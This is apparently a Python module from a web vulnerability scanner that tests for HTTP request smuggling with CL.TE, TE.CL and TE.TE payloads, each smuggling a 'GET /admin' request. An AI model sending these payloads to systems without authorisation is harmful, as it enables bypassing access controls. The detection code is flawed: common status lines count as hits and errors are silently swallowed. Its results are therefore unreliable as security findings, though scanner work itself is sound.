"""
HTTP Request Smuggling Scanner
Tests for HTTP/1.1 and HTTP/2 request smuggling vulnerabilities
"""
from typing import List, Optional
from .base import BaseScanner, Vulnerability, Severity


class HTTPSmugglingScanner(BaseScanner):
    """HTTP request smuggling vulnerability scanner"""
    
    def __init__(self, http_client, engine=None):
        super().__init__(http_client, engine)
        self.name = "HTTP Request Smuggling Scanner"
    
    async def scan(self, url: str, **kwargs) -> List[Vulnerability]:
        """Scan for HTTP request smuggling vulnerabilities"""
        vulnerabilities = []
        
        # Test CL.TE (Content-Length vs Transfer-Encoding)
        vuln = await self._test_cl_te_smuggling(url)
        if vuln:
            vulnerabilities.append(vuln)
        
        # Test TE.CL (Transfer-Encoding vs Content-Length)
        vuln = await self._test_te_cl_smuggling(url)
        if vuln:
            vulnerabilities.append(vuln)
        
        # Test TE.TE (Transfer-Encoding vs Transfer-Encoding)
        vuln = await self._test_te_te_smuggling(url)
        if vuln:
            vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    async def _test_cl_te_smuggling(self, url: str) -> Optional[Vulnerability]:
        """Test CL.TE request smuggling"""
        try:
            # CL.TE payload: Frontend uses Content-Length, backend uses Transfer-Encoding
            payload = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n"
            
            headers = {
                "Content-Length": str(len(payload)),
                "Transfer-Encoding": "chunked",
            }
            
            resp = await self.http_client.post(
                url,
                data=payload,
                headers=headers,
                timeout=10
            )
            
            # Check for smuggled request indicators
            if self._detect_smuggled_request(resp):
                return self._create_vulnerability(
                    name="HTTP Request Smuggling (CL.TE)",
                    severity=Severity.HIGH,
                    url=url,
                    payload=payload[:100],
                    description="HTTP request smuggling vulnerability detected (CL.TE variant)",
                    evidence="Smuggled request detected in response",
                    recommendation="Ensure consistent parsing of Content-Length and Transfer-Encoding headers. Reject ambiguous requests.",
                    cwe="CWE-444"
                )
        except:
            pass
        
        return None
    
    async def _test_te_cl_smuggling(self, url: str) -> Optional[Vulnerability]:
        """Test TE.CL request smuggling"""
        try:
            # TE.CL payload: Frontend uses Transfer-Encoding, backend uses Content-Length
            payload = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n"
            
            headers = {
                "Transfer-Encoding": "chunked",
                "Content-Length": "6",
            }
            
            resp = await self.http_client.post(
                url,
                data=payload,
                headers=headers,
                timeout=10
            )
            
            if self._detect_smuggled_request(resp):
                return self._create_vulnerability(
                    name="HTTP Request Smuggling (TE.CL)",
                    severity=Severity.HIGH,
                    url=url,
                    payload=payload[:100],
                    description="HTTP request smuggling vulnerability detected (TE.CL variant)",
                    evidence="Smuggled request detected in response",
                    recommendation="Ensure consistent parsing of Content-Length and Transfer-Encoding headers.",
                    cwe="CWE-444"
                )
        except:
            pass
        
        return None
    
    async def _test_te_te_smuggling(self, url: str) -> Optional[Vulnerability]:
        """Test TE.TE request smuggling"""
        try:
            # TE.TE payload: Conflicting Transfer-Encoding headers
            payload = "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n"
            
            headers = {
                "Transfer-Encoding": "chunked, chunked",
            }
            
            resp = await self.http_client.post(
                url,
                data=payload,
                headers=headers,
                timeout=10
            )
            
            if self._detect_smuggled_request(resp):
                return self._create_vulnerability(
                    name="HTTP Request Smuggling (TE.TE)",
                    severity=Severity.HIGH,
                    url=url,
                    payload=payload[:100],
                    description="HTTP request smuggling vulnerability detected (TE.TE variant)",
                    evidence="Smuggled request detected with conflicting Transfer-Encoding headers",
                    recommendation="Reject requests with multiple or conflicting Transfer-Encoding headers.",
                    cwe="CWE-444"
                )
        except:
            pass
        
        return None
    
    def _detect_smuggled_request(self, response) -> bool:
        """Detect if a smuggled request was processed"""
        # Check for indicators of smuggled request
        indicators = [
            "HTTP/1.1 404",
            "HTTP/1.1 200",
            "GET /admin",
            "Host: example.com",
            "unexpected request",
            "malformed request",
        ]
        
        response_text = response.text.lower()
        response_headers = str(response.headers).lower()
        
        # Check if smuggled request appears in response
        for indicator in indicators:
            if indicator.lower() in response_text or indicator.lower() in response_headers:
                return True
        
        return False

